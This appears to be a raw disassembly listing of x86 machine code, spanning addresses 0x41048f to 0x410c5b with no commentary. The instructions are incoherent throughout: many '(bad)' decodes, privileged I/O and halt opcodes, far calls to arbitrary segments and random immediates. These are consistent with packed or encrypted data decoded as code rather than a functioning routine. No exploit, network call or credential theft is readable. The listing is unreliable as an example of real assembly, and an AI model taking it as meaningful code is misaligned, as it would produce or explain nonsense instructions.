  41048f:	jmp    DWORD PTR [esp+eax*8-0x4a]
  410493:	sub    al,ch
  410495:	xor    cl,al
  410497:	lods   eax,DWORD PTR ds:[esi]
  410498:	xchg   edx,eax
  410499:	add    eax,0x78de805a
  41049e:	fild   QWORD PTR [ebx+0x5e5ca67f]
  4104a4:	add    cl,BYTE PTR [ecx+0x1d]
  4104a7:	mov    ds:0x8c091a20,al
  4104ac:	jecxz  0x41048c
  4104ae:	jae    0x410468
  4104b0:	lock add bh,bl
  4104b3:	mov    ds:0x8d3ca926,al
  4104b8:	clc    
  4104b9:	lds    ebx,FWORD PTR [edx]
  4104bb:	lock mov eax,0xb1f55098
  4104c1:	jp     0x4104ec
  4104c3:	fsub   QWORD PTR [ebx]
  4104c5:	xor    ebp,DWORD PTR [esi-0x33]
  4104c8:	mov    bl,BYTE PTR gs:[esi+ecx*1]
  4104cc:	push   esp
  4104cd:	xchg   esp,eax
  4104ce:	jnp    0x41046f
  4104d0:	xor    bl,BYTE PTR ds:0xb092deb1
  4104d6:	xor    dh,BYTE PTR [esi]
  4104d8:	adc    al,0x49
  4104da:	and    al,0x61
  4104dc:	inc    ebx
  4104dd:	push   ds
  4104de:	cld    
  4104df:	pop    ebp
  4104e0:	je     0x41049d
  4104e2:	or     BYTE PTR [edx],cl
  4104e4:	js     0x4104a7
  4104e6:	adc    ebp,0x8597b822
  4104ec:	js     0x41047c
  4104ee:	jmp    0xdfc799c6
  4104f3:	jo     0x410505
  4104f5:	inc    edi
  4104f6:	(bad)  
  4104f7:	lods   eax,DWORD PTR ds:[esi]
  4104f8:	and    ah,bl
  4104fa:	xor    eax,0x6ff86b0d
  4104ff:	xchg   ebx,eax
  410500:	inc    edi
  410501:	inc    esi
  410502:	mov    BYTE PTR [esi-0xbe5918e],ch
  410508:	xchg   DWORD PTR [bx+si-0x76a4],esp
  41050d:	into   
  41050e:	add    edi,DWORD PTR [edi]
  410510:	sbb    dh,BYTE PTR [esi+eiz*1-0x6c]
  410514:	inc    eax
  410515:	lods   eax,DWORD PTR ds:[esi]
  410516:	call   0x2bd7:0xe31afdb6
  41051d:	xchg   edx,eax
  41051e:	dec    esp
  41051f:	ins    BYTE PTR es:[edi],dx
  410520:	add    eax,0xa988142a
  410525:	ins    DWORD PTR es:[edi],dx
  410526:	sub    BYTE PTR [edx-0x1aa5e195],ch
  41052c:	repnz in al,0x60
  41052f:	shl    bh,cl
  410531:	xor    BYTE PTR [ecx-0x509382ef],dh
  410537:	mov    ebp,0x7df4ead
  41053c:	inc    edi
  41053d:	inc    ecx
  41053e:	js     0x410535
  410540:	xchg   edx,eax
  410541:	dec    ecx
  410542:	loope  0x410528
  410544:	cmp    al,0x1c
  410546:	cmp    al,0x8c
  410548:	mov    ecx,0xb76e118b
  41054d:	gs packuswb mm5,mm0
  410551:	push   edx
  410552:	test   DWORD PTR [edi+0x10],eax
  410555:	dec    edi
  410556:	mov    eax,0x98bab2d
  41055b:	fisubr DWORD PTR [ecx]
  41055d:	mov    esp,0x7dcf518c
  410562:	sub    eax,0xd0e52de8
  410567:	and    al,0xa4
  410569:	mov    al,ds:0xe2212369
  41056e:	test   al,0x69
  410570:	and    BYTE PTR [ecx+0x71f66c87],al
  410576:	fs cdq 
  410578:	mov    ds:0xe55ed733,eax
  41057d:	ins    DWORD PTR es:[edi],dx
  41057e:	retf   0x1a1a
  410581:	mov    bl,0xd
  410583:	cmp    bl,0xa9
  410586:	rcl    DWORD PTR [ebx+0x31],0xde
  41058a:	mov    edi,DWORD PTR [ecx]
  41058c:	xchg   edi,eax
  41058d:	inc    eax
  41058e:	sub    al,0x78
  410590:	daa    
  410591:	cmp    al,BYTE PTR [edx+0x7b18cc0e]
  410597:	imul   ebp,DWORD PTR ds:0x523ccb1c,0x48
  41059e:	icebp  
  41059f:	not    DWORD PTR [ebx]
  4105a1:	push   ds
  4105a2:	test   al,0x1a
  4105a4:	or     BYTE PTR [ebp-0x75b808e0],dl
  4105aa:	xor    DWORD PTR [eax-0x17bb189c],ebx
  4105b0:	leave  
  4105b1:	bound  eax,QWORD PTR [ebx]
  4105b3:	loop   0x41059b
  4105b5:	xchg   ecx,eax
  4105b6:	push   ebp
  4105b7:	push   ds
  4105b8:	push   esp
  4105b9:	mov    ch,0x6
  4105bb:	xchg   ecx,eax
  4105bc:	mov    cl,0x9c
  4105be:	pop    eax
  4105bf:	je     0x410565
  4105c1:	loopne 0x41057a
  4105c3:	adc    edx,DWORD PTR [ecx+0x29]
  4105c6:	stos   DWORD PTR es:[edi],eax
  4105c7:	cmp    dh,al
  4105c9:	add    bl,dh
  4105cb:	xchg   esi,eax
  4105cc:	repz ret 
  4105ce:	adc    DWORD PTR [ecx+ebx*8+0x12],edx
  4105d2:	push   esi
  4105d3:	sub    ebp,DWORD PTR [esi+0x2]
  4105d6:	fstp   QWORD PTR [edx+eax*2-0x15]
  4105da:	xchg   ebp,eax
  4105db:	xchg   esi,eax
  4105dc:	xchg   ebx,eax
  4105dd:	lock mov eax,ds:0xa9607e6b
  4105e3:	(bad)  
  4105e5:	fmul   st,st(2)
  4105e7:	stos   DWORD PTR es:[edi],eax
  4105e8:	inc    edx
  4105e9:	sahf   
  4105ea:	sub    BYTE PTR [ebp+ebp*4+0x4a2da3e7],dl
  4105f1:	aas    
  4105f2:	jle    0x4105a4
  4105f4:	push   0xffffffaa
  4105f6:	ds pop ecx
  4105f8:	(bad)  
  4105f9:	jp     0x410627
  4105fb:	mov    edx,0x961b0e0
  410600:	mov    esp,0x2a6437f
  410605:	stos   DWORD PTR es:[edi],eax
  410606:	aad    0x5c
  410608:	outs   dx,BYTE PTR ds:[esi]
  410609:	xchg   esp,eax
  41060a:	inc    edx
  41060b:	popa   
  41060c:	pop    ebx
  41060d:	pop    ebp
  41060e:	cli    
  41060f:	pusha  
  410610:	dec    DWORD PTR [ecx]
  410612:	mov    edi,ecx
  410614:	add    DWORD PTR ds:0xa811042f,ebp
  41061a:	std    
  41061b:	adc    esp,ecx
  41061d:	add    al,0x9a
  41061f:	inc    ebx
  410620:	pop    ss
  410621:	cmp    eax,esp
  410623:	jae    0x410694
  410625:	out    0x71,eax
  410627:	mov    WORD PTR [ecx-0x6e1d089c],?
  41062d:	inc    ebx
  41062e:	hlt    
  41062f:	inc    esi
  410630:	pop    ds
  410631:	or     BYTE PTR [esi+0x26],dl
  410634:	aas    
  410635:	cmovs  ecx,esi
  410638:	pop    ds
  410639:	pop    ebp
  41063a:	cld    
  41063b:	mov    bh,0xa6
  41063d:	cmp    al,dl
  41063f:	addr16 and ecx,esp
  410642:	mov    edx,0x733dfab
  410647:	xchg   ebp,eax
  410648:	js     0x410685
  41064a:	cwde   
  41064b:	jno    0x4105ed
  41064d:	lahf   
  41064e:	es cmp eax,0x4bdb955
  410654:	inc    esi
  410655:	xor    esi,0xc62b36cd
  41065b:	in     al,dx
  41065c:	rcl    ah,0xf7
  41065f:	test   DWORD PTR [ebp-0x301f7b0c],ebp
  410665:	(bad)  [esi-0x244d4a66]
  41066b:	repnz clc 
  41066d:	stos   DWORD PTR es:[edi],eax
  41066e:	mov    esi,0x81bbc732
  410673:	loop   0x4106cc
  410675:	sub    edx,ebx
  410677:	fmul   st(2),st
  410679:	repz push sp
  41067c:	out    0xdf,eax
  41067e:	xchg   ebx,eax
  41067f:	xchg   ebp,eax
  410680:	mov    ebx,0xc1b34f65
  410685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410686:	aaa    
  410687:	cld    
  410688:	adc    DWORD PTR [eax+edx*8],ebx
  41068b:	jne    0x4106ec
  41068d:	mov    eax,ds:0x1a3796ef
  410692:	call   0x8eee181f
  410697:	sahf   
  410698:	loop   0x4106e9
  41069a:	jmp    0x410716
  41069c:	in     eax,dx
  41069d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41069e:	mov    cs,WORD PTR [ecx]
  4106a0:	ins    BYTE PTR es:[edi],dx
  4106a1:	sub    edx,DWORD PTR [edx-0x9]
  4106a4:	adc    eax,0x5ff6acce
  4106a9:	mov    edx,0xfb645fb9
  4106ae:	xchg   edi,eax
  4106af:	mov    ds:0x15c5aca1,al
  4106b4:	(bad)  [esi]
  4106b6:	jle    0x4106aa
  4106b8:	mov    dl,0x93
  4106ba:	jle    0x4106cf
  4106bc:	fbstp  TBYTE PTR [ecx-0x4842e895]
  4106c2:	shl    DWORD PTR [eax],1
  4106c4:	pop    ss
  4106c5:	test   DWORD PTR [ebp+0x69],ecx
  4106c8:	sti    
  4106c9:	in     eax,0x2e
  4106cb:	out    dx,eax
  4106cc:	mov    es,WORD PTR [esi+eiz*8-0x20cde88d]
  4106d3:	inc    esp
  4106d4:	adc    DWORD PTR [esi-0xa27d768],ecx
  4106da:	xchg   esp,eax
  4106db:	enter  0xd540,0x5e
  4106df:	imul   edx,DWORD PTR [edi],0x4f
  4106e2:	fcom   DWORD PTR [ebx+eiz*2]
  4106e5:	jns    0x4106ae
  4106e7:	mov    edx,DWORD PTR [edi+0x73d0565c]
  4106ed:	xor    DWORD PTR [edi+0x6d],0xd
  4106f1:	popf   
  4106f2:	call   DWORD PTR [bx]
  4106f5:	outs   dx,BYTE PTR gs:[esi]
  4106f7:	and    esi,DWORD PTR [edx]
  4106f9:	fnstenv [ebx+esi*2-0x2b]
  4106fd:	or     BYTE PTR [ebp-0x790a8e33],bh
  410703:	stc    
  410704:	adc    bl,BYTE PTR [ecx+0x35]
  410707:	inc    edx
  410708:	or     DWORD PTR [edx+0x237dd239],0xffffffe7
  41070f:	pop    edx
  410710:	jno    0x41070a
  410712:	mov    eax,0xb69f6b7c
  410717:	mov    cl,BYTE PTR [esi-0x136db657]
  41071d:	mov    al,0x77
  41071f:	call   0xc264:0xc33359dc
  410726:	sub    BYTE PTR [edx],ch
  410728:	dec    edx
  410729:	outs   dx,BYTE PTR ds:[esi]
  41072a:	inc    ebx
  41072b:	mov    ds:0x8793344a,eax
  410730:	inc    eax
  410731:	ss jo  0x410727
  410734:	out    dx,al
  410735:	jl     0x4107ab
  410737:	add    al,0x57
  410739:	mov    al,ds:0xad7655bd
  41073e:	pop    edi
  41073f:	xchg   ebp,eax
  410740:	outs   dx,DWORD PTR ds:[esi]
  410741:	mov    WORD PTR [edx-0x4369c58c],gs
  410747:	or     eax,DWORD PTR [ebp+0x60]
  41074a:	aas    
  41074b:	ins    DWORD PTR es:[edi],dx
  41074c:	mov    DWORD PTR [ebx-0x50],ebp
  41074f:	inc    esi
  410750:	cli    
  410751:	mov    eax,ds:0x559d9c05
  410756:	jno    0x4106eb
  410758:	and    dh,0xc5
  41075b:	(bad)  
  41075c:	adc    al,0xff
  41075e:	jecxz  0x4107c0
  410760:	xor    BYTE PTR [esi+0x34],dh
  410763:	leave  
  410764:	sahf   
  410765:	fwait
  410766:	pop    es
  410767:	in     al,dx
  410768:	int    0xab
  41076a:	retf   
  41076b:	dec    ebp
  41076c:	int    0xca
  41076e:	fld    TBYTE PTR [edx-0x23]
  410771:	mov    dh,0x29
  410773:	pop    esi
  410774:	ret    
  410775:	jle    0x41079e
  410777:	xor    ecx,DWORD PTR [eax-0x3ac914b1]
  41077d:	ja     0x410751
  41077f:	xchg   ebp,eax
  410780:	jp     0x41073f
  410782:	jge    0x410728
  410784:	mov    eax,ds:0xd60cb9af
  410789:	or     esp,ebx
  41078b:	sbb    DWORD PTR [eax-0x5085b657],0xc5d8ffca
  410795:	shr    cl,1
  410797:	mov    al,ds:0x97c3520d
  41079c:	inc    edi
  41079d:	xchg   esp,eax
  41079e:	fs adc al,0x69
  4107a1:	or     al,0xd7
  4107a3:	imul   ebx,DWORD PTR [ecx+0x63a99a22],0x7656bb22
  4107ad:	push   es
  4107ae:	xlat   BYTE PTR ds:[ebx]
  4107af:	pop    ebp
  4107b0:	mov    bl,0x9
  4107b2:	(bad)  
  4107b3:	out    dx,eax
  4107b4:	pop    ss
  4107b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107b6:	mov    eax,ds:0xe87ddb67
  4107bb:	pop    es
  4107bc:	mov    fs,eax
  4107be:	mov    bh,0x74
  4107c0:	mov    WORD PTR [eiz*8+0xcd42d15],es
  4107c7:	(bad)  
  4107c9:	inc    esp
  4107ca:	fisttp WORD PTR [ecx]
  4107cc:	inc    ebx
  4107cd:	scas   al,BYTE PTR es:[edi]
  4107ce:	add    DWORD PTR [ecx+0x6a1a2c03],ebp
  4107d4:	iret   
  4107d5:	and    eax,esp
  4107d7:	adc    bl,cl
  4107d9:	xchg   esi,eax
  4107da:	sub    al,0x9a
  4107dc:	sbb    eax,0xdf9ef7c5
  4107e1:	es mov esi,0x426598f3
  4107e7:	xor    edi,DWORD PTR [esi-0x5b]
  4107ea:	xchg   edx,eax
  4107eb:	iret   
  4107ec:	add    al,0xe4
  4107ee:	retf   0xcd58
  4107f1:	and    cl,BYTE PTR [ebp+0xc]
  4107f4:	pop    esi
  4107f5:	fist   DWORD PTR [ecx+0x440682e1]
  4107fb:	mov    esi,0x94678d31
  410800:	or     DWORD PTR [edi+0x1],edx
  410803:	or     BYTE PTR [ebx+0xede2469],ah
  410809:	cmp    eax,0xde5fa163
  41080e:	and    DWORD PTR [ebx],edi
  410810:	mov    bl,BYTE PTR [esi]
  410812:	clc    
  410813:	stos   DWORD PTR es:[edi],eax
  410814:	jae    0x410863
  410816:	cmp    eax,DWORD PTR [esi+0x601d10f8]
  41081c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41081d:	clc    
  41081e:	add    BYTE PTR [esp+edx*4+0x7b73b758],dh
  410825:	or     DWORD PTR ds:0xa27fa827,edi
  41082b:	sub    DWORD PTR [ecx+eax*8],esi
  41082e:	icebp  
  41082f:	gs int 0xdb
  410832:	jmp    DWORD PTR [edi-0x5f6dbc7]
  410838:	jmp    0x1590:0x58c62dbc
  41083f:	lahf   
  410840:	ds popa 
  410842:	mov    ds:0x68f3b6b8,eax
  410847:	call   0x22bea6c1
  41084c:	(bad)  
  41084d:	mov    WORD PTR [ecx+eiz*4+0x7e],es
  410851:	cmp    al,0x34
  410853:	retf   
  410854:	sbb    bh,BYTE PTR [ecx]
  410856:	add    edi,DWORD PTR [ebx]
  410858:	xor    DWORD PTR [edx+0x42],esp
  41085b:	cmp    al,BYTE PTR [ecx+0x41]
  41085e:	mov    dh,0xe0
  410860:	je     0x4108cb
  410862:	scas   eax,DWORD PTR es:[edi]
  410863:	aas    
  410864:	push   es
  410865:	out    0x86,eax
  410867:	add    cl,0xfb
  41086a:	loopne 0x410873
  41086c:	fwait
  41086d:	xor    cl,BYTE PTR [esi+ebp*2-0x56eaa8a9]
  410874:	mov    bl,0x6c
  410876:	in     eax,dx
  410877:	aam    0x42
  410879:	push   ss
  41087a:	xchg   edi,eax
  41087b:	xlat   BYTE PTR ds:[ebx]
  41087c:	cmp    al,0x1c
  41087e:	or     al,0xf6
  410880:	(bad)  
  410881:	sbb    eax,0xe61ed733
  410886:	xor    al,0xe
  410888:	push   edi
  410889:	ret    0x173d
  41088c:	imul   edx,edi,0x56
  41088f:	idiv   DWORD PTR [ecx]
  410891:	aas    
  410892:	int    0xb
  410894:	and    ch,BYTE PTR ds:0xc134b0a7
  41089a:	test   DWORD PTR ds:0x34e58202,eax
  4108a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108a1:	jmp    0x5c366253
  4108a6:	lods   eax,DWORD PTR ds:[esi]
  4108a7:	(bad)  
  4108a8:	outs   dx,BYTE PTR ds:[esi]
  4108a9:	pop    ss
  4108aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108ab:	mov    cs,WORD PTR [esi+esi*2-0x1]
  4108af:	enter  0x6733,0xb4
  4108b3:	addr16 or esp,esi
  4108b6:	ins    BYTE PTR es:[edi],dx
  4108b7:	jns    0x410883
  4108b9:	hlt    
  4108ba:	mov    bh,0xdf
  4108bc:	(bad)  
  4108bd:	ss (bad) 
  4108bf:	jne    0x410940
  4108c1:	mov    esp,0x7187427f
  4108c6:	mov    esp,?
  4108c8:	and    DWORD PTR [ebp+0x3e],esp
  4108cb:	jbe    0x410928
  4108cd:	test   eax,0x1afcb7cd
  4108d2:	mov    ds,WORD PTR [edi-0x7f47a555]
  4108d8:	sub    eax,0xf9de8c59
  4108dd:	pop    ebp
  4108de:	cmp    DWORD PTR [esi+0x1],ebx
  4108e1:	ret    
  4108e2:	and    ah,BYTE PTR [edx+0xe]
  4108e5:	mov    WORD PTR [ecx+0x4],fs
  4108e8:	cwde   
  4108e9:	adc    BYTE PTR ss:[ebp+0xa],0x34
  4108ee:	xchg   ebp,eax
  4108ef:	mov    ch,BYTE PTR [ebp+0x5e]
  4108f2:	addr16 pop es
  4108f4:	sub    DWORD PTR [ebx-0x40],edi
  4108f7:	out    0x64,eax
  4108f9:	inc    eax
  4108fa:	cli    
  4108fb:	or     eax,0xd3d2837b
  410900:	sub    DWORD PTR [esi],ebx
  410902:	fsub   QWORD PTR ss:[eax-0x66]
  410906:	cmp    DWORD PTR [ebp+ecx*8+0x6c],esp
  41090a:	xchg   ecx,eax
  41090b:	in     al,dx
  41090c:	hlt    
  41090d:	inc    esp
  41090e:	inc    BYTE PTR [ebx-0x37d014ff]
  410914:	add    al,dl
  410916:	pop    esp
  410917:	inc    ecx
  410918:	inc    eax
  410919:	mov    ah,0x49
  41091b:	pop    ds
  41091c:	dec    eax
  41091d:	add    al,BYTE PTR [ebx-0x57b1ebe2]
  410923:	xchg   ah,dl
  410925:	repnz lods eax,DWORD PTR ds:[esi]
  410927:	add    al,0x20
  410929:	loopne 0x4109a5
  41092b:	ror    ebp,cl
  41092d:	ror    DWORD PTR [ecx-0x5e],0xc0
  410931:	test   ch,0xfc
  410934:	mov    eax,0xf0c99bd5
  410939:	mov    ds:0x78fc806f,al
  41093e:	retf   
  41093f:	pop    eax
  410940:	mov    dh,0x40
  410942:	pop    es
  410943:	xchg   bh,dl
  410945:	jne    0x4108ce
  410947:	mov    WORD PTR [ebx-0x32],ss
  41094a:	hlt    
  41094b:	pop    ebx
  41094c:	nop
  41094d:	xchg   edx,eax
  41094e:	jbe    0x4109a6
  410950:	dec    edi
  410951:	xor    DWORD PTR [esi],0x7ff4e152
  410957:	cdq    
  410958:	out    0xd7,eax
  41095a:	inc    esp
  41095b:	mov    edx,0xecadb8ec
  410960:	mov    dh,0x6
  410962:	jecxz  0x41095c
  410964:	das    
  410965:	repnz add cl,BYTE PTR [edx-0x62]
  410969:	jle    0x4109e4
  41096b:	lahf   
  41096c:	dec    ebp
  41096d:	pop    ebx
  41096e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41096f:	out    dx,al
  410970:	pop    ecx
  410971:	shl    bh,0xca
  410974:	popa   
  410975:	imul   eax,DWORD PTR [ebp-0x5f],0xbb209533
  41097c:	out    0x5c,eax
  41097e:	loop   0x410900
  410980:	(bad)  
  410981:	lahf   
  410982:	test   BYTE PTR ds:0x42a48d04,0x15
  410989:	mov    DWORD PTR [ebp-0x9],esp
  41098c:	pop    es
  41098d:	in     al,dx
  41098e:	fist   WORD PTR [eax+esi*8+0x4b7ea2d9]
  410995:	fstp   st(2)
  410997:	fimul  WORD PTR [ebp-0x5f]
  41099a:	ffree  st(0)
  41099c:	cmp    eax,0xd5a5b9a6
  4109a1:	dec    edi
  4109a2:	sub    DWORD PTR [ebp-0x17ad9c68],edx
  4109a8:	mov    ebx,DWORD PTR [edx+0x17]
  4109ab:	inc    eax
  4109ac:	inc    ecx
  4109ad:	pusha  
  4109ae:	ret    
  4109af:	sub    BYTE PTR [ecx+0x7a],dh
  4109b2:	adc    eax,0x26c09aef
  4109b7:	jae    0x410993
  4109b9:	pop    ds
  4109ba:	jl     0x4109ea
  4109bc:	or     eax,0x9bc6f32f
  4109c1:	sbb    eax,0x9468e4ad
  4109c6:	add    ecx,DWORD PTR [ebp+0x2c]
  4109c9:	enter  0xb55a,0x49
  4109cd:	jno    0x4109a8
  4109cf:	mov    al,ds:0xdb9800a4
  4109d4:	daa    
  4109d5:	push   cs
  4109d6:	lahf   
  4109d7:	mov    ebp,0xd1312b1f
  4109dc:	repz arpl WORD PTR [ebp-0x1b],ax
  4109e0:	mov    ah,ah
  4109e2:	mov    cs,WORD PTR [ebx-0x89263d8]
  4109e8:	test   BYTE PTR ds:0x50ac2071,ch
  4109ee:	xchg   eax,esp
  4109f0:	scas   al,BYTE PTR es:[edi]
  4109f1:	repz mov bl,0x2e
  4109f4:	(bad)  
  4109f6:	or     al,0xb8
  4109f8:	inc    eax
  4109f9:	stos   DWORD PTR es:[edi],eax
  4109fa:	add    al,0x9d
  4109fc:	int    0x56
  4109fe:	sub    DWORD PTR [ebx-0x3fd83c27],esp
  410a04:	inc    eax
  410a05:	mov    dl,0xd5
  410a07:	clc    
  410a08:	mov    bh,0xb7
  410a0a:	pushf  
  410a0b:	xor    BYTE PTR [ebx+0x33],bl
  410a0e:	or     DWORD PTR [ecx+0x4df90ac],0xffffffc1
  410a15:	push   0xfa68ad5a
  410a1a:	pop    ecx
  410a1b:	jns    0x410a7d
  410a1d:	mov    BYTE PTR [edx-0xce506af],cl
  410a23:	aaa    
  410a24:	clc    
  410a25:	int    0x3c
  410a27:	cmp    dl,BYTE PTR [eax]
  410a29:	clc    
  410a2a:	mov    esi,0x9536821c
  410a2f:	ins    DWORD PTR es:[edi],dx
  410a30:	ja     0x410a1d
  410a32:	xchg   esp,eax
  410a33:	sbb    al,ch
  410a35:	leave  
  410a36:	mov    dl,0x24
  410a38:	adc    bl,BYTE PTR [esi]
  410a3a:	sti    
  410a3b:	into   
  410a3c:	cmc    
  410a3d:	lods   eax,DWORD PTR ds:[esi]
  410a3e:	mov    esi,DWORD PTR [ecx]
  410a40:	pop    esp
  410a41:	dec    esi
  410a42:	mov    ch,0x4c
  410a44:	pushf  
  410a45:	ds dec edx
  410a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a48:	sti    
  410a49:	ror    BYTE PTR [edx-0xf],1
  410a4c:	sub    eax,0xecf73822
  410a51:	xor    DWORD PTR [ecx+ecx*4],ebx
  410a54:	mov    gs,WORD PTR [ecx+0x395017dc]
  410a5a:	mov    eax,ds:0x653fbebd
  410a5f:	push   ebp
  410a60:	test   bh,ah
  410a62:	cmp    al,0xb
  410a64:	push   ss
  410a65:	stos   DWORD PTR es:[edi],eax
  410a66:	adc    DWORD PTR [ecx],ecx
  410a68:	shl    BYTE PTR [edi],1
  410a6a:	repnz pop ds
  410a6c:	mov    ebx,0x6ff47a9f
  410a71:	std    
  410a72:	xchg   ebx,eax
  410a73:	xor    al,0xec
  410a75:	adc    ah,BYTE PTR [edi+0x31a6342f]
  410a7b:	mov    al,ds:0x86dabad0
  410a80:	cmc    
  410a81:	dec    esp
  410a82:	inc    ecx
  410a83:	adc    eax,0x36c145d9
  410a88:	jae    0x410aca
  410a8a:	stc    
  410a8b:	push   ss
  410a8c:	or     cl,BYTE PTR [ecx]
  410a8e:	ss cld 
  410a90:	add    ch,BYTE PTR ds:0x5c811695
  410a96:	std    
  410a97:	mov    ch,0x5d
  410a99:	dec    ebx
  410a9a:	shl    edi,0x94
  410a9d:	or     eax,DWORD PTR [edx+0x73]
  410aa0:	daa    
  410aa1:	std    
  410aa2:	pop    es
  410aa3:	test   bh,0x3b
  410aa6:	jns    0x410aa0
  410aa8:	pop    esi
  410aa9:	sub    eax,0x736f278c
  410aae:	hlt    
  410aaf:	dec    edi
  410ab0:	cmc    
  410ab1:	pop    edx
  410ab2:	les    esp,FWORD PTR [ecx-0x13]
  410ab5:	and    ch,BYTE PTR [ebp-0x23]
  410ab8:	inc    ecx
  410ab9:	push   ebp
  410aba:	pop    edx
  410abb:	stos   BYTE PTR es:[edi],al
  410abc:	enter  0x37db,0x9a
  410ac0:	es dec ebx
  410ac2:	dec    eax
  410ac3:	dec    ecx
  410ac4:	cmp    al,0x4d
  410ac6:	cmp    al,0x7
  410ac8:	in     eax,0x96
  410aca:	add    cl,BYTE PTR [edi-0x73c5c7f4]
  410ad0:	mov    dl,dh
  410ad2:	or     eax,0x56032143
  410ad8:	pop    eax
  410ad9:	std    
  410ada:	test   DWORD PTR [ebp-0x76],edi
  410add:	jg     0x410b1b
  410adf:	mov    edx,DWORD PTR es:[esi+ebp*4]
  410ae3:	into   
  410ae4:	ret    
  410ae5:	xchg   ecx,eax
  410ae6:	sar    BYTE PTR [edi-0x576ed515],cl
  410aec:	mov    BYTE PTR [ebx+0x3a],ah
  410aef:	mov    ah,0x30
  410af1:	push   esp
  410af2:	in     eax,dx
  410af3:	adc    BYTE PTR [eax+0x32],ah
  410af6:	mov    cl,0xdd
  410af8:	mov    esp,0xf221ff7d
  410afd:	rcl    BYTE PTR [ebx-0x427bc9ce],1
  410b03:	icebp  
  410b04:	int    0x7d
  410b06:	pop    eax
  410b07:	dec    eax
  410b08:	lea    ebx,[edx+0x3b]
  410b0b:	(bad)  
  410b0d:	clc    
  410b0e:	outs   dx,BYTE PTR cs:[esi]
  410b10:	es mov edi,0xccf5042a
  410b16:	ins    DWORD PTR es:[edi],dx
  410b17:	in     eax,dx
  410b18:	aam    0xd
  410b1a:	push   ebx
  410b1b:	cmp    al,BYTE PTR [ebx]
  410b1d:	sub    bl,BYTE PTR [esi]
  410b1f:	push   0x41be3ad9
  410b24:	mov    bl,0x9c
  410b26:	aam    0x48
  410b28:	repnz hlt 
  410b2a:	xlat   BYTE PTR ds:[ebx]
  410b2b:	aam    0x50
  410b2d:	push   ebx
  410b2e:	aam    0xe2
  410b30:	push   eax
  410b31:	cmp    eax,0x9e431321
  410b36:	push   ecx
  410b37:	rcr    DWORD PTR [edi],0xbe
  410b3a:	ja     0x410b53
  410b3c:	popf   
  410b3d:	jnp    0x410b43
  410b3f:	push   ebx
  410b40:	cmp    al,0x88
  410b42:	or     cl,BYTE PTR [edx-0x5e887e7d]
  410b48:	jnp    0x410b29
  410b4a:	sub    bh,BYTE PTR [esi+0x7c16a668]
  410b50:	mov    ebp,0x506126c2
  410b55:	inc    cx
  410b57:	jmp    0x410b57
  410b59:	xchg   ecx,eax
  410b5a:	mov    ah,0xc
  410b5c:	mov    ds:0xaecf715e,eax
  410b61:	sbb    al,0x8c
  410b63:	repnz xchg ecx,eax
  410b65:	add    BYTE PTR [ebp-0x56e42106],ah
  410b6b:	test   DWORD PTR [ebx+0x1d],ecx
  410b6e:	mov    eax,0x3102a858
  410b73:	or     esi,DWORD PTR [ebx-0x3b443071]
  410b79:	call   0x99f6:0xb969d16b
  410b80:	stc    
  410b81:	add    ch,BYTE PTR [ebx]
  410b83:	stos   BYTE PTR es:[edi],al
  410b84:	ss es inc edi
  410b87:	jmp    0x6e27:0x92a45f58
  410b8e:	push   esi
  410b8f:	pop    edx
  410b90:	lahf   
  410b91:	pop    edx
  410b92:	sub    eax,0x565e7d65
  410b97:	in     eax,0xe5
  410b99:	push   esp
  410b9a:	xchg   ebp,eax
  410b9b:	mov    ds:0x26b45aaf,eax
  410ba0:	ss cld 
  410ba2:	bound  ebx,QWORD PTR [edi]
  410ba4:	or     bl,BYTE PTR [esi+edx*8]
  410ba7:	cwde   
  410ba8:	cmp    al,0xf8
  410baa:	xor    ebp,DWORD PTR [ebx+0xef77c64]
  410bb0:	xchg   ebp,eax
  410bb1:	sub    BYTE PTR [ecx-0x3595edae],0x0
  410bb8:	mov    esi,0xf52c8b41
  410bbd:	mov    dh,0xa5
  410bbf:	sub    BYTE PTR [ebx-0x26],cl
  410bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bc3:	cmp    dl,0x5a
  410bc6:	push   eax
  410bc7:	scas   al,BYTE PTR es:[edi]
  410bc8:	dec    esp
  410bc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bca:	add    DWORD PTR [eax-0x1b9546c4],0xe8701787
  410bd4:	dec    ebp
  410bd5:	sbb    BYTE PTR [eax+0x630c8074],ah
  410bdb:	lea    esi,ds:0x9cb33f2e
  410be1:	mov    eax,fs:0x687271f9
  410be7:	fisttp QWORD PTR [edx-0x3c]
  410bea:	out    0x24,al
  410bec:	mov    eax,ds:0xb684f06b
  410bf1:	or     DWORD PTR [eax+0x70691d21],ebx
  410bf7:	dec    esp
  410bf8:	cs out dx,eax
  410bfa:	jb     0x410c0d
  410bfc:	push   ss
  410bfd:	or     eax,0xcb16ea5b
  410c02:	and    bh,ch
  410c04:	cmp    bh,BYTE PTR [eax-0x65]
  410c07:	out    dx,eax
  410c08:	(bad)  
  410c09:	pop    edx
  410c0a:	ds inc ebp
  410c0c:	xor    BYTE PTR [esi+eiz*4-0x72],dh
  410c10:	sbb    BYTE PTR [eax-0xedfdcf],cl
  410c16:	out    dx,al
  410c17:	pop    ebx
  410c18:	mov    ebx,0xf00fa02f
  410c1d:	lods   eax,DWORD PTR ds:[esi]
  410c1e:	(bad)  
  410c20:	xor    eax,0xe967fde7
  410c25:	scas   al,BYTE PTR es:[edi]
  410c26:	call   0x759bc434
  410c2b:	adc    DWORD PTR [ebx-0x7d67853e],esp
  410c31:	imul   cl
  410c33:	push   ebp
  410c34:	jl     0x410c54
  410c36:	dec    esi
  410c37:	inc    esp
  410c38:	xchg   BYTE PTR [edx],ah
  410c3a:	sub    eax,0xf568762
  410c3f:	call   0x10ae:0x8e1adcec
  410c46:	(bad)  
  410c47:	cmp    ch,BYTE PTR [esi]
  410c49:	push   ecx
  410c4a:	mov    eax,ds:0x1fb4927d
  410c4f:	test   BYTE PTR [bx+si+0x71],bh
  410c53:	cmp    ebp,esp
  410c55:	(bad)  
  410c56:	fisttp WORD PTR [ecx+0x79]
  410c59:	and    al,0x3a
  410c5b:	mov    ch,0xe6
